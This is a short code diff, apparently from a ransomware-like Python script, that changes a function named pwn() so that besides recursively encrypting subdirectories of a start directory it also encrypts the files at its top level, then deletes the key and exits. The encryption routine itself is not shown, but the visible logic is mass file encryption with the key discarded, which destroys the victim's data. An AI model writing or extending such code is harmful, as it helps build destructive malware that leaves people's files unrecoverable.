@@ -71,6 +71,9 @@ def pwn():
             directory = START_DIR + '/' + dir
         print('Encrypting {}'.format(directory))
         recurse(directory, key)
+    files = next(os.walk(START_DIR))[2]
+    for file in files:
+        encrypt(START_DIR, file, key)
     del key
     exit(0)
 
